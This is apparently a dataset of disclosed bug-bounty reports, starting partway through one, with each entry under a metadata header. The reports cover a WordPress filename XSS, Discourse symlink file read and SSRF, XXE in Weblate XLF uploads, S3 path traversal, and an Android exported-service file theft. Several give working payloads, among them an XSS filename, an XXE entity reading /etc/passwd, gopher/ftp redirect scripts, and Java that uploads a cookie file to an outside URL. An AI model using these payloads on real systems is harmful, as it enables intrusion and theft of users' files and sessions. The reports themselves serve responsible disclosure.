+Two different "file to large" cases end up in interpolating the file name and appending it into DOM unsanitized leading to XSS.
+
+I have attached pictures of one of the cases, in the attached case the file was 12.4 MB, in a freshly installed environment. For reproduction note that any file type can be used (.jar whatever) as the vuln happens before the type is validated.
+
+PoC
+-------------------
+Create a 20MB file called 
+
+`Dinosaurs secret life<img src=x  onerror=alert(1)>.png`
+
+Goto your wordpress site `http://127.0.0.1/wp-admin/media-new.php` and drag`n`drop or use file manager or choose the file via. the "Select Files" button.
+
+A error will appear with `... exceeds the maximum upload size for this site.` along with a alert box to display that the payload has been executed.
+
+Details on XSS
+-------------------
+The file `script-loader.php` prepares an array of messages for use later.
+
+```
+	// error message for both plupload and swfupload
+	$uploader_l10n = array(
+                ...
+		'file_exceeds_size_limit' => __('%s  exceeds the maximum upload size for this site.'),
+		'big_upload_failed' => __('Please try uploading this file with the %1$sbrowser uploader%2$s.'),
+		...
+	);
+```
+
+The payload will be injected into the `%s` in the key `file_exceeds_size_limit`.
+
+This happens because the `$uploader_l10n` is passed to `handlers.min.js` (non minified version shown)
+ and interpolated without escaping the value previously.
+
+First the value passes trough a error case 
+```
+// $uploader_l10n
+case plupload.FILE_SIZE_ERROR:
+			uploadSizeError(uploader, fileObj); // fileObj contains the filename payload in name attribute.
+			break;
+....
+if ( max > hundredmb && fileObj.size > hundredmb )
+				wpFileError( fileObj, pluploadL10n.big_upload_failed.replace('%1$s', '<a class="uploader-html" href="#">').replace('%2$s', '</a>') );
+```
+
+and lastely interpolated and appended to the dom.
+
+```
+
+function uploadSizeError( up, file, over100mb ) {
+	var message;
+
+	if ( over100mb )
+		message = pluploadL10n.big_upload_queued.replace('%s', file.name) + ' ' + pluploadL10n.big_upload_failed.replace('%1$s', '<a class="uploader-html" href="#">').replace('%2$s', '</a>');
+	else
+		message = pluploadL10n.file_exceeds_size_limit.replace('%s', file.name);
+
+
+	jQuery('#media-items').append('<div id="media-item-' + file.id + '" class="media-item error"><p>' + message + '</p></div>');
+	up.removeFile(file);
+}
+```
+
+The critical lines are 
+```
+message = pluploadL10n.big_upload_queued.replace('%s', file.name) + ' ' + pluploadL10n.big_upload_failed.replace('%1$s', '<a class="uploader-html" href="#">').replace('%2$s', '</a>');
+	else
+		message = pluploadL10n.file_exceeds_size_limit.replace('%s', file.name);
+```
+
+# Suggested fix:
+Remove the filename or escape safely in context.
+===== FU-208481 | Remote file inclusion vulnerability on a DoD website | sev=medium | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=266 | src=summaries
+A misconfigured Department of Defense website may have allowed unauthorized users to remotely download local files, potentially revealing sensitive system or user information. @sp1d3rs was able to demonstrate this vulnerability by crafting a specially formatted URL.
+===== FU-213558 | Arbitrary Local-File Read from Admin - Restore From Backup due to Symlinks | sev=high | bounty=512.0 | substate=resolved | weak=Information Disclosure | len=1442 | src=vulnerability_information
+As an Admin user on Discourse there is a feature to create, upload, and restore backups. Generating a backup creates a tar file consisting of the database as a SQL file and uploaded files from /public/upload/*. Having the ability to upload these tar files and restore from them, you can add any file that you wish. 
+
+Manually modifying the tar archive and adding a symlink, you are able to read any arbitrary file that the user has permission to including files outside of the Discourse application directory.
+
+## Steps
+
+1. Load http://try.discourse.org
+2. Login as an Admin user.
+3. Go to the Backups page:
+ * http://try.discourse.org/admin/backups/
+4. Create a new backup including files.
+5. Extract the backup files to a folder on your server.
+6. Create a symlink to `/etc/passwd` In the /uploads/ folder of the backup, e.g. `/uploads/default/original/1X/[file].jpg`.
+ * example: `ln -s /etc/passwd /home/symlink/files/uploads/default/original/1X/7ad2e8f5fe02890f20503044b604e29e6f3718fd.png`
+7. Create a .tar.gz from the extracted files.
+8. Upload the newly crafted tar to the server.
+9. Enable `Restore from Backups` in settings if it's not enabled.
+10. Restore from the backup that uploaded.
+11. Go to the uploaded file in your browser after it uploads, e.g.
+ * http://try.discourse.org/uploads/default/original/1X/[file].jpg
+12. ---> You were able to read file contents of `/etc/passwd` due to the symlink being extracted from the tar.
+===== FU-221928 | Malicious file can be hidden as Card Attachment or Card Cover image | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-228377 | SSRF in upload IMG through URL | sev=low | bounty=64.0 | substate=resolved | weak=Information Disclosure | len=4991 | src=vulnerability_information
+-Short description
+
+Private message function is vulnerable is vulnerable to a SSRF vulnerability which allows an attacker to craft connections originating from  servers to any destination on the internet and discourse internal network and craft outgoing UDP-packet (for example, to connect to  FTP  servers from discourse).
+read more at:
+https://cwe.mitre.org/data/definitions/918.html
+
+1. Load http://try.discourse.org
+2. Go to new message composer
+3. Set the receiver, topic 
+4 set the message content
+TEST  [![](http://192.166.218.53/malicious3.php)](http://192.166.218.53/malicious3.php)
+
+5. Set the malicious3.php file on your remote server to:
+
+<?php
+        header('Location: gopher://192.166.218.53:80/test123');
+?>
+
+6. Send the private message.
+
+7. Check your remote server, in my case "192.166.218.53" web logs file (access.log)
+OUTPUT :
+
+64.71.168.198 - - [14/May/2017:16:38:04 -0400] "HEAD /malicious3.php HTTP/1.1" 302 187 "-" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36"
+64.71.168.198 - - [14/May/2017:16:38:04 -0400] "GET /malicious3.php HTTP/1.1" 302 225 "-" "Ruby"
+64.71.168.198 - - [14/May/2017:16:38:04 -0400] "HEAD /test123 HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36"
+
+-------------------------------------------------------------------------------------
+
+-  Request for FTP connection
+1. Load http://try.discourse.org
+2. Go to new message composer
+3. Set the receiver, topic
+4. set the message content
+TESTs  [![](http://192.166.218.53/malicious3.php)](http://192.166.218.53/malicious3.php)
+
+5. Set the malicious3.php file on your remote server to:
+
+<?php
+        header('Location: ftp://192.166.218.53/');
+?>
+
+6. Send the private message.
+
+7. Check your remote server, in my case "192.166.218.53" ftp  logs file. (vsftp.log).
+OUTPUT :
+Sun May 14 15:29:40 2017 [pid 18354] CONNECT: Client "::ffff:64.71.168.198"
+
+-------------------------------------------------------------------------------------
+- Here is the burp suite request:
+
+POST /posts HTTP/1.1
+Host: try.discourse.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+X-CSRF-Token: 1QJrm4k6xUHhUyhoEJUElbbSVsufYPnbQd8N+Jti7/TtHEJxOpfDairKu0ufS/ovBIWt/mtdISC36Tx8OMdD/w==
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Discourse-Visible: true
+X-Requested-With: XMLHttpRequest
+Referer: https://try.discourse.org/t/adsadas/835/7
+Content-Length: 437
+Cookie: __utma=228756441.806995719.1494765035.1494768541.1494792827.3; __utmc=228756441; __utmz=228756441.1494765035.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _forum_session=V29LcnpQVXRTdWJ5dUdkWXQxOEhRRXFHRk5vbmtMS2lhRHdqVXdsYjRpUzhpQ2I1OHBLZVFZVFJqUXFtTUZXM0p0MTJwNWh0M3k3Y0R0NDl0VFBjR3hBQkZZMUlMbno5eTQvOEZtZkdjTFNzTVBNL1R1SDRua1BVMWtpTURyWXR3bnNGeWFPb1pBQnFpQW1ORFllNG04bWthUkFVZ01YTm9PWVB2dS96bmUybXkxU1ZaS2c1WkVlbExwK0pRMjlvaGF6WWY5bi9WeGlrd2xFNmtUYWhUaE01OHVRT05acFJWV3AyQXhUQ1U4YVpVZDV6UVFjSDBtc2NJa3R6dE1aeDVnaE9BblBKK0J4QVlKdGMxQmtYSTNZaGlJL1NFL3lma2pRVktIZWROazZnMTlmbXpSRDFTeVRWeHMveS9HckYxQXdjZ2dZQjdIVmV3aW4reUgzYjNwUWJ2YXVYY0Z4cWlrL2dzeXBmUGoxZVdhQ0JBTTFKZlB3SWhiZ24yZHZkVGYzYVJFb3lJZEhVTENxbHc1WWN1eDdrVGlVTHNLMTZEMG12WTJnVVNQRVhkWEhoTU1EUDNyQVZUdklkdmQwSlNhSlZVcXhQL3FFSzRqWmRyeFozV3BxRWtrK3FuZzBsWnlXVmVJeFVxNTBOMk5YVnR4d21kTXlIaEtlakp3aEJPZURoNm11Uy83d3l6U09kZnNrNnNiUEJBSjRQT0xXdWtqdlUxak5LK2MyaW1kbUlSRGtjWWo5eWJZT21OMk9ScmNFd1o2OG4xUTNIV0ZoVHJlVTFFSUlxKy9RbmZERDRtQ1dKaDVtSFBEeFZXMTNsOEcrMG13Vzc3c1R3R2hJMUdNOHJHT0lHRU93U20waG5pajhRQTZVNmhGT0tVTmNZa1d6TW5HSVg3c2pvTUkrNjhNZFpwRHVyalFVSWVWa0ktLTdpcUxTWCs5dEhsVHRFekRDQ3FLUHc9PQ%3D%3D--3bf9351bc59d99d10f831dcc1e647054ddef3c41; __utmb=228756441.9.10.1494792827; _t=aebe2511952a805cec46af434b6617d5
+Connection: close
+
+raw=TESTa+%5B!%5B%5D(http%3A%2F%2F192.166.218.53%2Fmalicious3.php)%5D(http%3A%2F%2F192.166.218.53%2Fmalicious3.php)&unlist_topic=false&category=&topic_id=835&is_warning=false&archetype=regular&typing_duration_msecs=100&composer_open_duration_msecs=9183&featured_link=&image_sizes%5Bhttp%3A%2F%2F192.166.218.53%2Fmalicious3.php%5D%5Bwidth%5D=24&image_sizes%5Bhttp%3A%2F%2F192.166.218.53%2Fmalicious3.php%5D%5Bheight%5D=24&nested_post=true
+
+-------------------------------------------------------------------------------------
+
+The attacker is able to send internal server side requests using Ruby client.
+Check the attached screens for prove.
+
+Why does the vulnerability exist?
+
+discourse.org does not properly validate user input and does not configure ruby client properly which allows an attacker to use various  protocol wrappers other than http(s). For example, an attacker can supply ftp://test.com/file as an URL and discourse will make such a FTP request.
+
+If the description is not clear please feel free to ask us for more detailed report.
+
+regards www.afine.pl
+===== FU-230714 | Arbitary file download vulnerability on a DoD website | sev=medium | bounty=None | substate=resolved | weak=Insecure Direct Object Reference (IDOR) | len=667 | src=summaries
+A DoD website was misconfigured in a manner that could have allowed an attacker to collect sensitive information about the web application and system. @psychomantis was able to demonstrate this vulnerability by crafting a specially formatted URL. Thank you for notifying us of this vulnerability!
+
+
+This website used DotNetNuke EventsCalendar which is prone to an arbitrary-file-download vulnerability.  An example of what this looks like  is this, website.com/desktopmodules/eventscalendar/downloaddoc.aspx
+We can exploit this by appending ?f=~/downloaddoc.aspx  so it'd look like this, website.com/desktopmodules/eventscalendar/downloaddoc.aspx?f=~/downloaddoc.aspx
+===== FU-230870 | Arbitary file download vulnerability on a DoD website | sev=medium | bounty=None | substate=resolved | weak=Insecure Direct Object Reference (IDOR) | len=666 | src=summaries
+A DoD website was misconfigured in a manner that could have allowed an attacker to collect sensitive information about the web application or system. @psychomantis was able to demonstrate this vulnerability by crafting a specially formatted URL. Thank you for notifying us of this vulnerability!
+
+
+This website used DotNetNuke EventsCalendar which is prone to an arbitrary-file-download vulnerability.  An example of what this looks like  is this, website.com/desktopmodules/eventscalendar/downloaddoc.aspx
+We can exploit this by appending ?f=~/downloaddoc.aspx  so it'd look like this, website.com/desktopmodules/eventscalendar/downloaddoc.aspx?f=~/downloaddoc.aspx
+===== FU-232614 | Uploaded XLF files result in External Entity Execution | sev=high | bounty=None | substate=resolved | weak=XML External Entities (XXE) | len=2519 | src=vulnerability_information
+Summary:
+========
+ Weblate users in the Translate group (or those with the ability to upload translation files) can trigger XML External Entity Execution. This is a well known and high/critical vector of attack that often can completely compromise the security of a web application or in some cases lead to Remote Code Execution (although I do not expect it to be an easy RCE in this case).
+
+Description:
+========
+The XML External Entity Execution allows for arbitrary reading of files on the server using a relatively obscure aspect of the XML language. It is generally considered high or critical severity, most notably Google places it at the same severity as remote code execution because of the potential for Server-Side Request Forgery, Remote Code Exection, and arbitrary File Read.
+
+The mitigating factors here for you are that some account priveleges are required to upload tranlation files, although by default this gets rolled into the @Translate group. Also because your web server is python based it is not vulnerable to the trivial RCE that PHP servers are commonly vulnerable to.
+
+The core of the vulnerability is in how the translate-toolkit processes .XLF files. The XLIFF standard is XML based, and thus supports by default standard XML functionality including external entity execution.
+
+In my proof of concept, I dowloaded as .XLF the translations of the "hello" project which is being pointed to by my local Weblate instance. A minor modification shown in the steps below results in the /etc/passwd file out through the UI for review as a translation, although much worse things can be done - this is just to prove the vulnerability exists. For more details search for "XML External Entity Exploit"
+
+See the attached screenshots and exploit XML file for evidence of the vulnerability.
+
+Version:
+========
+
+I tested this against the latest stable source available a couple fo days ago (~May 26) running "Weblate 2.15-dev"
+
+Steps to Reproduce
+========
+(I have included a live exploit testproject-testcomponent-en_GB.xlf that works with the "hello" data backing the demo website.)
+
+* Log in as a user that has permission to upload translation files.
+* Go to a component, and download its translations as XLF
+* Add the following two lines after the "<?xml" tag, and replace one of the translation texts with "&xxe;" :
+
+```
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+```
+* Upload the file back to the server
+* Observe the contents of the passwd file as a translation
+===== FU-248745 | Unpatched (https://hackerone.com/reports/221928)- Unviladate File Upload to XSS on trello-attachment Bucket | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-254200 | Escaping images directory in S3 bucket when saving new avatar, using Path Traversal in filename | sev=medium | bounty=None | substate=resolved | weak=Path Traversal | len=1688 | src=summaries
+Thanks again @sp1d3rs, also for the summary. Nothing to add from our side except maybe for the wish for more reports having this quality.
+
+Final comment: nothing from that bucket was ever exposed to any user except the uploader, also nothing in the bucket is there for real archiving purposes.
+
+I was able to escape from the unique directory (where the user's avatar is stored after uploading -`https://unikrn-files.s3-eu-west-1.amazonaws.com/users/<userid>/<date>/<filename+params>`) in the S3 bucket using `../` characters in the filename (for example, `test../../../../../../test.jpg`) on the `https://unikrn.com/apiv2/user/upload` endpoint. It was possible to upload arbitrary files to the any other directory, and also overwrite existing files (which could belong to other users) and resources.
+
+##Reproduction steps
+
+1) Login to your profile on https://unikrn.com/profile
+2) Start the Web Debugger
+3) Upload any image as avatar and intercept the request to the https://unikrn.com/apiv2/user/upload
+4) Change the filename in the request to the
+```
+{
+    "filename": "test2../../../../../../test2.jpg",
+    "type": "image/jpeg",
+    "reason": "image/*",
+    "session_id": "<session>"
+}
+```
+5) Execute the request.
+6) You now have test2.jpg in the root of your bucket.
+
+Usually arbitrary file upload in the S3 bucket does not pose much risk, but not in the case when the attacker with no permissions is able to escape from the isolated directory, and affect/overwrite other files, which supposed to be not accessible for him.
+
+The issue was fixed using filename sanitization, and i didn't find the way to bypass it.
+Thanks to the Unikrn team for the fast response, fix, and the bounty!
+===== FU-258117 | RCE/LFI on test Jenkins instance due to improper authentication flow | sev=medium | bounty=None | substate=resolved | weak=Improper Access Control - Generic | len=495 | src=summaries
+@nahamsec found a test Jenkins instance where they could login with any valid Google account.
+
+Once logged in, they gained the ability to execute arbitrary code via the Jenkins Script Console. This was a test jenkins instance with no access to source code or resources.
+
+###Methodology
+Here is the Methodology used to find this bug: https://www.hackerone.com/blog/how-to-recon-and-content-discovery
+
+###Possible blog post?
+If I get a chance, I may release all details on in a dedicated blogpost.
+===== FU-258460 | [Quora Android] Possible to steal arbitrary files from mobile device | sev=medium | bounty=None | substate=resolved | weak=Information Disclosure | len=2328 | src=vulnerability_information
+**Summary:**
+Service
+```xml
+<service android:enabled="true" android:exported="true" android:name="net.gotev.uploadservice.UploadService"/>
+```
+enabled and exported. If it's exported, it means that any third party application can access it and send arbitrary data into it.
+
+The following code sends main database file to arbitrary server (I used http://google.com/zaheck):
+```java
+        UploadTaskParameters params = new UploadTaskParameters();
+        params.setId("1337");
+        params.setServerUrl("http://google.com/zaheck");
+        try {
+            params.addFile(new UploadFile("/data/data/com.quora.android/app_webview/Cookies"));
+
+        }
+        catch(FileNotFoundException e) {
+            throw new IllegalStateException(e); /* should be never thrown because not checked on the client side */
+        }
+
+        Intent intent = new Intent("net.gotev.uploadservice.action.upload");
+        intent.setClassName("com.quora.android", "net.gotev.uploadservice.UploadService");
+        intent.putExtra("taskClass", "net.gotev.uploadservice.MultipartUploadTask");
+        intent.putExtra("multipartUtf8Charset", true);
+        intent.putExtra("httpTaskParameters", new HttpUploadTaskParameters());
+        intent.putExtra("taskParameters", params);
+        startService(intent);
+```
+In the result protected file ```/data/data/com.quora.android/app_webview/Cookies``` which is not accessible to any application besides yours is sent to the attacker. It's really serious vulnerability which allows to takeover accounts. It can be used by any third party installed application on the same device. On the newest Androids it also can be exploited via Instant Apps directly from a web-browser (installation of an app is not required).
+
+**Description (Include Impact):**
+I believe it's not your vulnerability, but the gotev's library you use. Anyway, attacker can steal files with settings, cookies (even httpOnly, it doesn't matter), google authorization token is stored in shared_prefs file, which also can be stolen
+
+PoC:
+{F211064}
+
+This file contain sensitive cookies
+{F211066}
+
+### Steps To Reproduce
+ I attached an apk file which sends ```/data/data/com.quora.android/app_webview/Cookies``` to http://google.com/zaheck
+
+Install apk and open it, file with all cookies will be sent automatically to attacker provided URL
